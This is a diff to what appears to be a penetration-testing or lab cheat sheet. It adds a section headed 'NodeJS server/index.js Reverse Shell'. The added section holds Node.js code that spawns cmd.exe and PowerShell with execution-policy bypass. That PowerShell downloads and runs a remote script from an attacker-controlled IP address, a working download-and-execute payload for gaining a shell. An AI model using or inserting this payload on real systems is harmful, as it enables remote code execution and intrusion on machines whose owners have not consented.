@@ -17,3 +17,14 @@ Run JS Rev Shell to obtain shell!
 ```
 
 </details>
+
+<details>
+
+<summary>NodeJS server/index.js Reverse Shell</summary>
+
+```javascript
+var spawn = require("child_process").spawn, child;
+child = spawn("cmd.exe", ["/c powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.218/runall.ps1'))", ]);
+```
+
+</details>
